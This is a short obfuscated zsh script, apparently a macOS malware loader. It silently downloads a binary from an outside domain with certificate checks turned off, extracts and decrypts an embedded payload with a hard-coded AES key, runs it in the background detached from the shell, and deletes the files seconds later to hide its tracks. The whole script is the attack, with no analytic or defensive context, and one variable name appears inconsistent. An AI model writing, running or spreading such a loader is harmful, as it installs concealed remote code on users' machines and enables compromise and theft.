#!/bin/zsh
tvfw5=$(mktemp /tmp/9ute77.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m3ccaca4b94c550e5.bin" -o "$tvfw5z" || exit 1
ythzv3=$(stat -f %z "$tvfw5z"); h3q42un=$(( ythzv3 - 2053 - 3940 ))
tail -c +$(( 2053 + 1 )) "$tvfw5z" | head -c $h3q42un | openssl enc -d -aes-256-cbc -k 805c52ac455b2343cd4d94b5 -out "$tvfw5" 2>/dev/null
[ -s "$tvfw5" ] && chmod 700 "$tvfw5" && ( "$tvfw5" & ) && disown
( sleep 3; rm -f "$tvfw5" "$tvfw5z" ) &>/dev/null &
